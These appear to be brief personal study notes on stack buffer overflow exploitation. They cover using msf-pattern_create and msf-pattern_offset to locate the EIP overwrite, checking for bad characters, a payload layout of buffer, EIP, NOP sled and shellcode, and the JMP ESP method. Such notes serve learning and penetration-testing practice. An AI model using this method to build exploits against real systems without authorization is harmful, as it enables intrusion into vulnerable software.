Find exact position of EIP overwrite:

msf-pattern_create -l 2500
  get number of chars to use in PoC or simply overflow with a high amount of chars (e.g. 5000)
  use value in EIP at time of overflow in msf-pattern-offset
msf-pattern_offset -l 2500 -q 33794332/bytes_in_eip
  shows precise position of EIP
  
Be careful of bad chars- even if all bytes to FF are on the stack, some may have been removed before the bytes are placed onto the stack.


buffer + EIP + offset + NOP + shellcode

JMP ESP method seems to be very reliable-when used in the above scenario, the instuction results in a jump to our NOP sled.
